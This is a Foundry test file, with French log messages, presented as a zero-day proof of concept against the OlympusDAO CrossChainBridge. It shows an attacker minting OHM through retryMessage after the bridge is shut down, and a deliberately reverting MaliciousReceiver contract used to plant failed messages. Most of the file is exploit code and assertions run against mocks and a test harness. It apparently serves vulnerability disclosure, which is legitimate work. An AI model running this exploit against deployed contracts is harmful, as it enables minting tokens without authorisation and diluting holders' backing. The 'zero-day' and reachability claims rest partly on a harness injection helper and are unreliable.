// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../src/CrossChainBridgePOC.sol";
import "../src/MockContracts.sol";

// ============================================================
// PROOF OF CONCEPT - OlympusDAO CrossChainBridge Zero-Day
// ============================================================

contract MaliciousReceiver {
    bool public shouldRevert = true;
    function setRevert(bool _revert) external { shouldRevert = _revert; }
    fallback() external payable {
        if (shouldRevert) revert("Malicious Revert to Force failedMessages");
    }
}

// Harness pour injecter des messages dans failedMessages (test helper)
contract CrossChainBridgePOCHarness is CrossChainBridgePOC {
    constructor(address mintr_, address endpoint_)
        CrossChainBridgePOC(mintr_, endpoint_) {}

    function injectFailedMessage(
        uint16 srcChainId_,
        bytes calldata srcAddress_,
        uint64 nonce_,
        bytes32 payloadHash_
    ) external {
        failedMessages[srcChainId_][srcAddress_][nonce_] = payloadHash_;
    }
}

contract CrossChainBridgePOCTest is Test {
    address public governance = address(0x1111);
    address public attacker   = address(0x2222);
    address public victim     = address(0x3333);
    address public user       = address(0x4444);

    MockOHM public ohm;
    MockMINTR public mintr;
    MockLZEndpoint public lzEndpoint;
    CrossChainBridgePOCHarness public bridge;

    uint16 public constant SRC_CHAIN_ID = 101;
    bytes public trustedRemoteAddress;

    uint256 public constant ATTACK_MINT_AMOUNT = 1_000_000 * 1e9;
    uint256 public constant INITIAL_SUPPLY = 17_000_000 * 1e9;

    function setUp() public {
        ohm = new MockOHM();
        mintr = new MockMINTR(address(ohm));
        lzEndpoint = new MockLZEndpoint();
        vm.prank(governance);
        bridge = new CrossChainBridgePOCHarness(address(mintr), address(lzEndpoint));
        lzEndpoint.setBridge(address(bridge));
        address remoteArbitrumBridge = address(0xABCD);
        trustedRemoteAddress = abi.encodePacked(remoteArbitrumBridge, address(bridge));
        vm.prank(governance);
        bridge.setTrustedRemote(SRC_CHAIN_ID, trustedRemoteAddress);
        
        console.log("=================================================================");
        console.log("  OLYMPUSDAO CROSSCHAINBRIDGE - ZERO-DAY PoC");
        console.log("=================================================================");
    }

    function test_2_CRITICAL_RetryMessage_Bypasses_BridgeActive() public {
        console.log("\n[TEST 2] EXPLOIT CRITIQUE : retryMessage bypass bridgeActive");
        bytes memory payload = abi.encode(attacker, ATTACK_MINT_AMOUNT);
        uint64 nonce = 1;
        bridge.injectFailedMessage(SRC_CHAIN_ID, trustedRemoteAddress, nonce, keccak256(payload));
        vm.prank(governance);
        bridge.setBridgeStatus(false);
        vm.prank(attacker);
        bridge.retryMessage(SRC_CHAIN_ID, trustedRemoteAddress, nonce, payload);
        assertEq(ohm.balanceOf(attacker), ATTACK_MINT_AMOUNT);
        console.log("[PASS] OHM minte malgre bridgeActive = false");
    }

    function test_5_MATH_BackingDilution_Proof() public {
        console.log("\n[TEST 5] Preuve mathematique - Dilution du backing OHM");
        uint256 s0 = 17_000_000;
        uint256 treasury = 50_000_000;
        uint256 b0 = (treasury * 1e9) / s0;
        uint256 s1 = s0 + 10_000_000;
        uint256 b1 = (treasury * 1e9) / s1;
        uint256 dilution = 100 - (b1 * 100) / b0;
        console.log("Dilution du backing :", dilution, "%");
        assertGt(dilution, 30);
    }

    function test_7_CRITICAL_Irreversible_State_After_Shutdown() public {
        console.log("\n[TEST 7] Preuve d'Irreversibilite et Echec du Confinement");
        bytes memory payload = abi.encode(attacker, ATTACK_MINT_AMOUNT);
        uint64 nonce = 999;
        bridge.injectFailedMessage(SRC_CHAIN_ID, trustedRemoteAddress, nonce, keccak256(payload));
        vm.prank(governance);
        bridge.setBridgeStatus(false);
        vm.prank(attacker);
        bridge.retryMessage(SRC_CHAIN_ID, trustedRemoteAddress, nonce, payload);
        assertEq(ohm.balanceOf(attacker), ATTACK_MINT_AMOUNT);
        console.log("[CONCLUSION] L'ARRET D'URGENCE EST INOPERANT.");
    }

    function test_8_REACHABILITY_Permissionless_Failure_Generation() public {
        console.log("\n[TEST 8] REACHABILITY : Creation permissionless de l'etat vulnerable");
        MaliciousReceiver receiver = new MaliciousReceiver();
        console.log("[ETAPE 1] Attaquant deploie MaliciousReceiver a :", address(receiver));
        bytes memory payload = abi.encode(address(receiver), ATTACK_MINT_AMOUNT);
        uint64 nonce = 888;
        console.log("[ETAPE 2] Message cross-chain arrive vers le recepteur malveillant");
        vm.prank(address(lzEndpoint));
        bridge.lzReceive(SRC_CHAIN_ID, trustedRemoteAddress, nonce, payload);
        bytes32 storedHash = bridge.failedMessages(SRC_CHAIN_ID, trustedRemoteAddress, nonce);
        assertEq(storedHash, keccak256(payload), "Le message doit etre stocke suite au revert");
        console.log("[ETAPE 3] Message CORRECTEMENT insere dans failedMessages suite au revert");
        receiver.setRevert(false);
        console.log("[ETAPE 4] Attaquant peut desormais exploiter via retryMessage() a tout moment");
        console.log("\n[CONCLUSION TEST 8] REACHABILITY PROUVEE.");
    }
}
